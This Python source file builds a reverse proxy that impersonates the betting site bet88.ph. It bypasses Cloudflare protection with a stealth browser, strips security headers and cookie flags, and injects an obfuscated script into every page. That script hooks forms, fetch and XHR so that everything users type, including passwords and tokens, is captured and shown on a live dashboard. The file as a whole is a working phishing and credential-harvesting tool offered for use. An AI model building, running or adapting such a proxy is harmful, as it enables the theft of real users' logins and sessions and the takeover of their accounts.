import sys
if sys.platform == "win32":
    import asyncio
    asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())

import re
import time
import uuid
import json
import asyncio
import random
import string
import websockets

from typing import Dict, List, Any, Optional
from datetime import datetime, timezone
from contextlib import asynccontextmanager

from curl_cffi.requests import AsyncSession
from fastapi import FastAPI, Request, Response, HTTPException, WebSocket
from fastapi.responses import StreamingResponse, JSONResponse, HTMLResponse
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from camoufox.async_api import AsyncCamoufox

import os
from dotenv import load_dotenv

load_dotenv()
PROXY_URL = os.getenv("PROXY_URL")  # optional: "http://user:pass@host:port"

# =========================================================
# [CONFIGURATION]
# =========================================================
TARGET_BASE   = "https://bet88.ph/"
TARGET_DOMAIN = urlparse(TARGET_BASE).netloc
TARGET_ORIGIN = TARGET_BASE.rstrip("/")

IMPERSONATE = "chrome120"

HOP_BY_HOP = {
    "connection", "keep-alive", "proxy-authenticate", "proxy-authorization",
    "te", "trailers", "transfer-encoding", "upgrade", "host",
    "x-forwarded-for", "x-forwarded-proto", "x-real-ip", "via",
    "x-forwarded-host", "x-forwarded-port",
}

CF_COOKIE_NAMES  = {"cf_clearance", "__cfuid", "__cf_bm", "__cflb", "_cfuvid"}
COOKIE_DOMAIN_RE = re.compile(r"(?i);\s*Domain=[^;]+")
CDN_CGI_RE       = re.compile(r"^cdn-cgi/")
AUTH_KEYWORDS    = ["login", "auth", "signin", "token", "password"]
SESSION_FILE     = "proxy_sessions.json"
SESSION_TIMEOUT  = 1800

CHROME_NAV_HEADERS = [
    ("sec-ch-ua",          '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'),
    ("sec-ch-ua-mobile",   "?0"),
    ("sec-ch-ua-platform", '"Windows"'),
    ("sec-fetch-dest",     "document"),
    ("sec-fetch-mode",     "navigate"),
    ("sec-fetch-site",     "none"),
    ("sec-fetch-user",     "?1"),
    ("dnt",                "1"),
]

CHROME_FETCH_HEADERS = [
    ("sec-ch-ua",          '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'),
    ("sec-ch-ua-mobile",   "?0"),
    ("sec-ch-ua-platform", '"Windows"'),
    ("sec-fetch-dest",     "empty"),
    ("sec-fetch-mode",     "cors"),
    ("sec-fetch-site",     "same-origin"),
]


# =========================================================
# [CAPTURE SCRIPT]
# =========================================================
def _rand(n: int = 12) -> str:
    return "_" + "".join(random.choices(string.ascii_lowercase, k=n))

_ATTR_ATTACHED = _rand()
_ATTR_METHOD   = _rand()
_ATTR_URL_KEY  = _rand()


def get_capture_script() -> str:
    return f"""<script>
(function(){{
    var _origFetch = window.fetch;

    var _cap = function(type, url, method, payload) {{
        try {{
            _origFetch('/capture', {{
                method:    'POST',
                headers:   {{'Content-Type': 'application/json'}},
                body:      JSON.stringify({{type:type, url:url, method:method.toUpperCase(), payload:payload}}),
                keepalive: true
            }});
        }} catch(e) {{}}
    }};

    var _af = function() {{
        document.querySelectorAll('form').forEach(function(f) {{
            if (f.dataset['{_ATTR_ATTACHED}']) return;
            f.dataset['{_ATTR_ATTACHED}'] = '1';
            f.addEventListener('submit', function() {{
                var d = {{}};
                f.querySelectorAll('input,textarea,select').forEach(function(el) {{
                    var n = el.name || el.id;
                    if (n) d[n] = (el.type==='checkbox'||el.type==='radio') ? el.checked : el.value;
                }});
                _cap('form', f.action || location.href, f.method || 'GET', d);
            }}, true);
        }});
    }};
    document.readyState === 'loading'
        ? document.addEventListener('DOMContentLoaded', _af) : _af();
    new MutationObserver(_af).observe(document.documentElement, {{childList:true, subtree:true}});

    window.__origFetch__ = _origFetch;
    Object.defineProperty(window, 'fetch', {{
        enumerable: false, configurable: true, writable: true,
        value: function() {{
            var a = Array.prototype.slice.call(arguments);
            var res = a[0], cfg = a[1] || {{}};
            var url = typeof res === 'string' ? res : (res && res.url ? res.url : '');
            if (url !== '/capture')
                _cap('fetch', url, cfg.method||'GET', {{b: cfg.body ? cfg.body.toString() : null}});
            return _origFetch.apply(this, a);
        }}
    }});

    var _xp = XMLHttpRequest.prototype;
    var _oo = _xp.open, _os = _xp.send;
    Object.defineProperty(_xp, 'open', {{
        enumerable: false, configurable: true, writable: true,
        value: function(m, u) {{
            this['{_ATTR_METHOD}'] = m; this['{_ATTR_URL_KEY}'] = u;
            return _oo.apply(this, arguments);
        }}
    }});
    Object.defineProperty(_xp, 'send', {{
        enumerable: false, configurable: true, writable: true,
        value: function(body) {{
            if (this['{_ATTR_URL_KEY}'] !== '/capture')
                _cap('xhr', this['{_ATTR_URL_KEY}'], this['{_ATTR_METHOD}'],
                     {{b: body ? body.toString() : null}});
            return _os.apply(this, arguments);
        }}
    }});
}})();
</script>"""


# =========================================================
# [CLOUDFLARE SOLVER]
#
# Uses camoufox — patches Firefox at the binary level,
# much harder for CF to detect than playwright-stealth.
# One global lock — only one solve at a time.
# Solved cookies are cached and reused across all sessions.
# =========================================================
class CFSolver:
    def __init__(self):
        self._global_lock = asyncio.Lock()
        self._shared_cookies: Dict[str, str] = {}
        self._user_agent: Optional[str] = None

    async def start(self):
        print("[CF] Camoufox solver ready.")

    async def stop(self):
        pass

    async def solve(self, session_id: str) -> Dict[str, str]:
        async with self._global_lock:
            # Reuse cached clearance — no browser needed
            if self._shared_cookies.get("cf_clearance"):
                print(f"[CF] Reusing cached clearance for {session_id[:8]}")
                return dict(self._shared_cookies)

            print(f"[CF] Solving for session {session_id[:8]}…")
            try:
                async with AsyncCamoufox(
                    headless=False,
                    geoip=True,
                    humanize=True,
                    proxy={"server": PROXY_URL} if PROXY_URL else None,
                ) as browser:
                    page = await browser.new_page()

                    try:
                        await page.goto(TARGET_BASE, wait_until="networkidle", timeout=45000)
                    except Exception:
                        pass

                    await asyncio.sleep(5)

                    self._user_agent = await page.evaluate("navigator.userAgent")
                    print(f"[CF] Solver UA: {self._user_agent}")

                    cf_cookies: Dict[str, str] = {}
                    for _ in range(45):
                        all_cookies = await page.context.cookies(TARGET_BASE)
                        cf_cookies = {
                            c["name"]: c["value"]
                            for c in all_cookies
                            if c["name"] in CF_COOKIE_NAMES
                        }
                        if "cf_clearance" in cf_cookies:
                            break
                        await asyncio.sleep(1)

                if "cf_clearance" in cf_cookies:
                    print(f"[CF] Solved for {session_id[:8]} — "
                          f"clearance: {cf_cookies['cf_clearance'][:20]}…")
                    self._shared_cookies = dict(cf_cookies)
                else:
                    print(f"[CF] Failed to get cf_clearance for {session_id[:8]}")

                return cf_cookies

            except Exception as e:
                print(f"[CF] Solver exception for {session_id[:8]}: {e}")
                return {}


cf_solver = CFSolver()


# =========================================================
# [URL / CSS / JSON REWRITERS]
# =========================================================
TARGET_DOMAIN_RE = re.compile(r"(?i)(https?:)?//((?:[a-z0-9-]+\.)*?)" + re.escape(TARGET_DOMAIN))

def _build_proxy_url(proxy_domain: str, sub: str) -> str:
    sub = sub.rstrip(".")
    if sub:
        return f"http://{proxy_domain}/__sub/{sub}"
    return f"http://{proxy_domain}"

def rewrite_url(url: str, proxy_domain: str, base_url: str = None) -> str:
    if not url:
        return url
    if url.startswith("//" + TARGET_DOMAIN):
        url = "https:" + url
    if base_url and url.startswith("/") and not url.startswith("//"):
        url = urljoin(base_url, url)
    url = TARGET_DOMAIN_RE.sub(lambda m: _build_proxy_url(proxy_domain, m.group(2)), url)
    return url


def rewrite_css(css: str, proxy_domain: str) -> str:
    if not css:
        return css
    def _r(m):
        return f"url({m.group(1)}{rewrite_url(m.group(2), proxy_domain)}{m.group(3)})"
    return re.sub(r'url\(([\'"]?)(.*?)([\'"]?)\)', _r, css)


def rewrite_json_obj(data: Any, proxy_domain: str) -> Any:
    if isinstance(data, dict):
        return {k: rewrite_json_obj(v, proxy_domain) for k, v in data.items()}
    if isinstance(data, list):
        return [rewrite_json_obj(i, proxy_domain) for i in data]
    if isinstance(data, str) and TARGET_DOMAIN_RE.search(data):
        return rewrite_url(data, proxy_domain)
    return data


def rewrite_fast(text: str, proxy_domain: str) -> str:
    return TARGET_DOMAIN_RE.sub(lambda m: _build_proxy_url(proxy_domain, m.group(2)), text)


# =========================================================
# [LOGGER]
# =========================================================
class ProxyLogger:
    def __init__(self, max_logs: int = 1000):
        self.logs: List[dict] = []
        self.max_logs = max_logs
        self.lock = asyncio.Lock()

    async def log(self, event_type: str, session_id: str = "N/A",
                  method: str = "-", path: str = "-",
                  status: int = 0, data: dict = None):
        entry = {
            "timestamp":  datetime.now(timezone.utc).isoformat(),
            "type":       event_type,
            "session_id": session_id,
            "method":     method,
            "path":       path,
            "status":     status,
            "data":       data or {},
        }
        async with self.lock:
            self.logs.insert(0, entry)
            if len(self.logs) > self.max_logs:
                self.logs.pop()

    async def get_all(self) -> List[dict]:
        async with self.lock:
            return list(self.logs)

proxy_logger = ProxyLogger()


# =========================================================
# [SESSION MANAGER]
# =========================================================
class SessionManager:
    def __init__(self):
        self.sessions: Dict[str, dict] = {}
        self.lock = asyncio.Lock()

    async def load(self):
        try:
            with open(SESSION_FILE) as f:
                async with self.lock:
                    self.sessions = json.load(f)
            print(f"[*] Loaded {len(self.sessions)} sessions.")
        except (FileNotFoundError, json.JSONDecodeError):
            print("[*] No session file — starting fresh.")

    async def save(self):
        async with self.lock:
            with open(SESSION_FILE, "w") as f:
                json.dump(self.sessions, f)

    async def get_or_create(self, sid: str = None) -> str:
        async with self.lock:
            now = time.time()
            if sid and sid in self.sessions:
                self.sessions[sid]["last_accessed"] = now
                return sid
            new_id = str(uuid.uuid4())
            self.sessions[new_id] = {"cookies": {}, "last_accessed": now}
            asyncio.create_task(proxy_logger.log("session_created", session_id=new_id))
            return new_id

    async def get_cookies(self, sid: str) -> dict:
        async with self.lock:
            s = self.sessions.get(sid)
            if s:
                s["last_accessed"] = time.time()
                return s["cookies"].copy()
            return {}

    async def has_clearance(self, sid: str) -> bool:
        # Also treat a prior failed attempt as "done" to avoid infinite loops
        cookies = await self.get_cookies(sid)
        return "cf_clearance" in cookies or cookies.get("_cf_solve_attempted") == "1"

    async def update_cookies(self, sid: str, new: dict):
        if not new:
            return
        async with self.lock:
            if sid not in self.sessions:
                return
            stored = self.sessions[sid]["cookies"]
            for k, v in new.items():
                if k in CF_COOKIE_NAMES and k in stored and not v:
                    continue
                stored[k] = v
        asyncio.create_task(self.save())

    async def cleanup_loop(self):
        while True:
            await asyncio.sleep(60)
            now = time.time()
            expired = []
            async with self.lock:
                for sid, d in self.sessions.items():
                    if now - d["last_accessed"] > SESSION_TIMEOUT:
                        expired.append(sid)
                for sid in expired:
                    del self.sessions[sid]
            if expired:
                print(f"[*] Expired {len(expired)} sessions.")
                await self.save()

session_manager = SessionManager()


# =========================================================
# [APP LIFESPAN]
# =========================================================
@asynccontextmanager
async def lifespan(app: FastAPI):
    await session_manager.load()
    await cf_solver.start()
    cleanup_task = asyncio.create_task(session_manager.cleanup_loop())
    yield
    cleanup_task.cancel()
    await cf_solver.stop()
    await session_manager.save()

app = FastAPI(lifespan=lifespan)

curl_client = AsyncSession(
    impersonate=IMPERSONATE,
    verify=True,
    proxies={"https": PROXY_URL, "http": PROXY_URL} if PROXY_URL else None,
)


# =========================================================
# [DASHBOARD]
# =========================================================
@app.get("/_proxy_api/logs")
async def api_logs():
    return JSONResponse({"logs": await proxy_logger.get_all()})


@app.get("/_proxy_dashboard", response_class=HTMLResponse)
async def dashboard():
    return HTMLResponse("""<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><title>Proxy Dashboard</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-gray-900 text-gray-200 p-6 font-sans">
<div class="max-w-7xl mx-auto">
  <div class="flex justify-between items-center mb-6">
    <h1 class="text-3xl font-bold text-white">📡 Live Proxy Dashboard</h1>
    <label class="flex items-center space-x-2 cursor-pointer">
      <input type="checkbox" id="ar" class="h-5 w-5" checked>
      <span>Auto-Refresh (2s)</span>
    </label>
  </div>
  <div class="bg-gray-800 rounded-lg shadow overflow-x-auto">
    <table class="min-w-full divide-y divide-gray-700">
      <thead class="bg-gray-700"><tr>
        <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Time</th>
        <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Type</th>
        <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Session</th>
        <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Method / Path</th>
        <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Status</th>
        <th class="px-4 py-3 text-left text-xs font-medium text-gray-300 uppercase">Payload</th>
      </tr></thead>
      <tbody id="tb" class="divide-y divide-gray-700"></tbody>
    </table>
  </div>
</div>
<script>
let iv;
async function load() {
  const d = await (await fetch('/_proxy_api/logs')).json();
  const tb = document.getElementById('tb');
  tb.innerHTML = '';
  d.logs.forEach(l => {
    const tr = document.createElement('tr');
    const c = l.type === 'auth_intercept'   ? 'text-red-400 font-bold'
             : l.type === 'cf_solving'       ? 'text-orange-400 font-bold'
             : l.type === 'cf_solved'        ? 'text-green-400 font-bold'
             : l.type === 'cf_solve_failed'  ? 'text-red-400'
             : l.type.startsWith('capture') ? 'text-yellow-400'
             : 'text-blue-400';
    const ds = Object.keys(l.data).length ? JSON.stringify(l.data, null, 2) : '-';
    tr.innerHTML = `
      <td class="px-4 py-3 text-xs text-gray-400 align-top whitespace-nowrap">
        ${new Date(l.timestamp).toLocaleTimeString()}</td>
      <td class="px-4 py-3 text-xs ${c} align-top">${l.type.toUpperCase()}</td>
      <td class="px-4 py-3 text-xs text-gray-400 align-top" title="${l.session_id}">
        ${l.session_id.substring(0,8)}…</td>
      <td class="px-4 py-3 text-xs align-top">
        <span class="font-bold">${l.method}</span><br>
        <span class="text-gray-500 truncate block max-w-xs" title="${l.path}">${l.path}</span></td>
      <td class="px-4 py-3 text-xs text-gray-400 align-top">${l.status || '-'}</td>
      <td class="px-4 py-3 text-xs align-top">
        <div class="max-h-40 max-w-lg overflow-auto bg-gray-900 p-2 rounded border border-gray-700">
          <pre class="whitespace-pre-wrap break-all text-xs">${ds}</pre>
        </div></td>`;
    tb.appendChild(tr);
  });
}
function toggle() {
  clearInterval(iv);
  if (document.getElementById('ar').checked) iv = setInterval(load, 2000);
}
document.getElementById('ar').addEventListener('change', toggle);
load(); toggle();
</script></body></html>""")


# =========================================================
# [CAPTURE ENDPOINT]
# =========================================================
@app.post("/capture")
async def capture(request: Request, data: dict):
    sid = request.cookies.get("proxy_session_id", "N/A")
    await proxy_logger.log(
        f"capture_{data.get('type', '?')}",
        sid,
        data.get("method", "POST"),
        data.get("url", "/capture"),
        data=data.get("payload", {}),
    )
    return JSONResponse({"status": "ok"})


# =========================================================
# [WEBSOCKET PROXY]
# =========================================================
@app.websocket("/{path:path}")
async def ws_proxy(websocket: WebSocket, path: str):
    await websocket.accept()
    sid        = websocket.cookies.get("proxy_session_id")
    session_id = await session_manager.get_or_create(sid)
    cookies    = await session_manager.get_cookies(session_id)
    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

    ws_headers = {"Origin": TARGET_ORIGIN}
    if cookie_str:
        ws_headers["Cookie"] = cookie_str
    for h in ("sec-websocket-extensions", "sec-websocket-protocol", "sec-websocket-version"):
        v = websocket.headers.get(h)
        if v:
            ws_headers[h] = v

    ws_base    = TARGET_BASE.replace("https://", "wss://").replace("http://", "ws://")
    target_url = urljoin(ws_base.rstrip("/") + "/", path)
    if websocket.url.query:
        target_url += f"?{websocket.url.query}"

    try:
        async with websockets.connect(target_url, extra_headers=ws_headers) as tws:
            async def to_target():
                try:
                    while True:
                        msg = await websocket.receive()
                        if "text"    in msg: await tws.send(msg["text"])
                        elif "bytes" in msg: await tws.send(msg["bytes"])
                        elif msg["type"] == "websocket.disconnect": break
                except Exception as e:
                    await proxy_logger.log("ws_client_error", session_id, data={"error": str(e)})

            async def to_client():
                try:
                    while True:
                        d = await tws.recv()
                        if isinstance(d, str): await websocket.send_text(d)
                        else:                  await websocket.send_bytes(d)
                except websockets.exceptions.ConnectionClosed:
                    pass
                except Exception as e:
                    await proxy_logger.log("ws_upstream_error", session_id, data={"error": str(e)})

            await asyncio.gather(to_target(), to_client())
    except Exception as e:
        await proxy_logger.log("ws_failed", session_id, data={"error": str(e)})
    finally:
        try:
            await websocket.close()
        except Exception:
            pass


# =========================================================
# [HTTP PROXY — main handler]
# =========================================================
@app.api_route(
    "/{path:path}",
    methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"],
)
async def proxy(request: Request, path: str):
    query      = request.url.query

    # Extract encoded subdomain from path
    subdomain = None
    if path.startswith("__sub/"):
        parts = path.split("/", 2)
        subdomain = parts[1]
        path = parts[2] if len(parts) > 2 else ""

    if subdomain:
        target_url = f"https://{subdomain}.{TARGET_DOMAIN}/{path}"
    else:
        target_url = urljoin(TARGET_BASE.rstrip("/") + "/", path)
    if query:
        target_url += f"?{query}"

    proxy_base   = str(request.base_url).rstrip("/")
    proxy_domain = urlparse(proxy_base).netloc

    # Session / cookie management
    sid        = request.cookies.get("proxy_session_id")
    session_id = await session_manager.get_or_create(sid)
    s_cookies  = await session_manager.get_cookies(session_id)
    browser_cookies = {k: v for k, v in request.cookies.items() if k != "proxy_session_id"}
    merged_cookies  = {**s_cookies, **browser_cookies}

    is_cdn_cgi = bool(CDN_CGI_RE.match(path))

    # Block service worker files
    if path.lower() in ("sw.js", "service-worker.js", "serviceWorker.js", "service_worker.js"):
        return Response(content=b"self.addEventListener('install',e=>self.skipWaiting());self.addEventListener('activate',e=>e.waitUntil(self.clients.claim()));self.addEventListener('fetch',()=>{});", status_code=200, media_type="application/javascript")

    # CF Solver — attempt once per session, never loops
    if not is_cdn_cgi and not await session_manager.has_clearance(session_id):
        # Mark attempted immediately so concurrent requests don't pile in
        await session_manager.update_cookies(session_id, {"_cf_solve_attempted": "1"})
        await proxy_logger.log("cf_solving", session_id, request.method, f"/{path}")
        cf_cookies = await cf_solver.solve(session_id)
        if cf_cookies:
            await session_manager.update_cookies(session_id, cf_cookies)
            merged_cookies.update(cf_cookies)
            await proxy_logger.log(
                "cf_solved", session_id,
                data={"cookies": list(cf_cookies.keys())},
            )
        else:
            await proxy_logger.log("cf_solve_failed", session_id)

    # Build outbound headers
    is_nav = (
        request.method == "GET"
        and request.headers.get("sec-fetch-dest", "document") == "document"
        and not is_cdn_cgi
    )

    out_headers: Dict[str, str] = {}
    for k, v in request.headers.items():
        kl = k.lower()
        if kl in HOP_BY_HOP:
            continue
        if kl.startswith("sec-ch-") or kl.startswith("sec-fetch-") or kl == "dnt":
            continue
        if kl == "content-security-policy":
            continue
        if kl in ("referer", "origin"):
            v = v.replace(proxy_domain, TARGET_DOMAIN)
            v = v.replace(f"http://{TARGET_DOMAIN}", f"https://{TARGET_DOMAIN}")
        out_headers[k] = v

    out_headers["host"] = f"{subdomain}.{TARGET_DOMAIN}" if subdomain else TARGET_DOMAIN
    out_headers["accept-encoding"] = "identity"
    if not is_cdn_cgi:
        for k, v in (CHROME_NAV_HEADERS if is_nav else CHROME_FETCH_HEADERS):
            out_headers[k] = v

    if cf_solver._user_agent and any(k in merged_cookies for k in CF_COOKIE_NAMES):
        out_headers["user-agent"] = cf_solver._user_agent
        del out_headers["sec-ch-ua"]
        del out_headers["sec-ch-ua-mobile"]
        del out_headers["sec-ch-ua-platform"]

    body = await request.body()

    if request.method == "POST" and any(kw in path.lower() for kw in AUTH_KEYWORDS):
        try:
            await proxy_logger.log(
                "auth_intercept", session_id, request.method, f"/{path}",
                data={"payload": body.decode("utf-8", errors="replace")},
            )
        except Exception:
            pass

    # Fire upstream request
    try:
        resp = await curl_client.request(
            method=request.method,
            url=target_url,
            headers=out_headers,
            cookies=merged_cookies,
            data=body,
            allow_redirects=False,
            stream=True,
        )
        await proxy_logger.log(
            "proxy_request", session_id, request.method, f"/{path}",
            status=resp.status_code,
        )
    except Exception as exc:
        await proxy_logger.log(
            "proxy_error", session_id, request.method, f"/{path}",
            data={"error": str(exc)},
        )
        raise HTTPException(status_code=502, detail=f"Upstream error: {exc}")

    if resp.cookies:
        await session_manager.update_cookies(session_id, dict(resp.cookies))

    # cdn-cgi: stream raw bytes
    if is_cdn_cgi:
        async def _cdn_stream():
            try:
                async for chunk in resp.aiter_content():
                    yield chunk
            except Exception:
                pass

        cdn_resp = StreamingResponse(
            _cdn_stream(),
            status_code=resp.status_code,
            media_type=resp.headers.get("content-type", "application/octet-stream"),
        )
        raw_items = (
            resp.headers.multi_items()
            if hasattr(resp.headers, "multi_items")
            else list(resp.headers.items())
        )
        for k, v in raw_items:
            if k.lower() in ("content-length", "content-type", "transfer-encoding"):
                continue
            cdn_resp.headers.append(k, v)
        return cdn_resp

    # Response header processing
    processed: list = []
    raw_items = (
        resp.headers.multi_items()
        if hasattr(resp.headers, "multi_items")
        else list(resp.headers.items())
    )

    for k, v in raw_items:
        kl = k.lower()
        if kl in HOP_BY_HOP:
            continue
        if kl == "location":
            if TARGET_DOMAIN in v:
                v = v.replace(TARGET_DOMAIN, proxy_domain)
                v = v.replace(f"https://{proxy_domain}", f"http://{proxy_domain}")
            processed.append((k, v))
        elif kl == "set-cookie":
            v = COOKIE_DOMAIN_RE.sub("", v)
            v = re.sub(r"(?i);\s*Secure", "", v)
            is_cf_cookie = any(name in v for name in CF_COOKIE_NAMES)
            if not is_cf_cookie:
                v = re.sub(r"(?i);\s*SameSite=None", "; SameSite=Lax", v)
            processed.append((k, v))
        elif kl == "link":
            if TARGET_DOMAIN in v:
                v = v.replace(TARGET_DOMAIN, proxy_domain)
                v = v.replace(f"https://{proxy_domain}", f"http://{proxy_domain}")
            processed.append((k, v))
        elif kl == "content-security-policy":
            continue
        else:
            processed.append((k, v))

    content_type = resp.headers.get("content-type", "").lower()

    # Content rewriting
    is_text = any(t in content_type for t in [
        "text/html", "javascript", "json", "application/javascript", "text/css",
    ])

    if is_text:
        try:
            raw = await resp.acontent()
        except Exception:
            raise HTTPException(status_code=502, detail="Upstream dropped connection.")

        text = raw.decode("utf-8", errors="ignore")

        if "text/html" in content_type:
            soup = BeautifulSoup(text, "html.parser")

            for tag in soup.find_all(["a", "link", "base"], href=True):
                tag["href"] = rewrite_url(tag["href"], proxy_domain, TARGET_BASE)
            for tag in soup.find_all(
                ["script", "img", "iframe", "source", "audio", "video"], src=True
            ):
                tag["src"] = rewrite_url(tag["src"], proxy_domain, TARGET_BASE)
            for tag in soup.find_all("form", action=True):
                tag["action"] = rewrite_url(tag["action"], proxy_domain, TARGET_BASE)

            for tag in soup.find_all(
                "meta", attrs={"http-equiv": lambda x: x and x.lower() == "refresh"}
            ):
                cv = tag.get("content", "")
                if ";" in cv:
                    delay, url_part = cv.split(";", 1)
                    if url_part.strip().lower().startswith("url="):
                        orig = url_part.strip()[4:].strip("'\"")
                        tag["content"] = (
                            f"{delay};url={rewrite_url(orig, proxy_domain, TARGET_BASE)}"
                        )

            for tag in soup.find_all("style"):
                if tag.string:
                    tag.string = rewrite_css(tag.string, proxy_domain)
            for tag in soup.find_all(style=True):
                tag["style"] = rewrite_css(tag["style"], proxy_domain)
            for tag in soup.find_all("script"):
                if tag.string and not tag.get("src"):
                    tag.string = rewrite_fast(tag.string, proxy_domain)

            capture_soup = BeautifulSoup(get_capture_script(), "html.parser")
            head_tag = soup.find("head")
            if head_tag:
                head_tag.insert(0, capture_soup)
            elif soup.find("body"):
                soup.find("body").insert(0, capture_soup)
            else:
                soup.insert(0, capture_soup)

            rewritten = str(soup)

        elif "application/json" in content_type:
            try:
                rewritten = json.dumps(rewrite_json_obj(json.loads(text), proxy_domain))
            except json.JSONDecodeError:
                rewritten = rewrite_fast(text, proxy_domain)

        else:
            rewritten = rewrite_fast(text, proxy_domain)
            if "text/css" in content_type:
                rewritten = rewrite_css(rewritten, proxy_domain)

        final = Response(
            content=rewritten.encode("utf-8"),
            status_code=resp.status_code,
            media_type=content_type,
        )

    else:
        async def _stream():
            try:
                async for chunk in resp.aiter_content():
                    yield chunk
            except Exception:
                pass

        final = StreamingResponse(_stream(), status_code=resp.status_code)

    if "content-length" in final.headers:
        del final.headers["content-length"]

    if sid != session_id:
        final.set_cookie(
            key="proxy_session_id",
            value=session_id,
            httponly=True,
            samesite="Lax",
            max_age=SESSION_TIMEOUT,
        )

    for k, v in processed:
        if k.lower() in (
            "content-length", "content-type", "content-encoding", "transfer-encoding"
        ):
            continue
        final.headers.append(k, v)

    return final


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(
        app,
        host="127.0.0.1",
        port=8000,
        reload=False,
        loop="none",
    )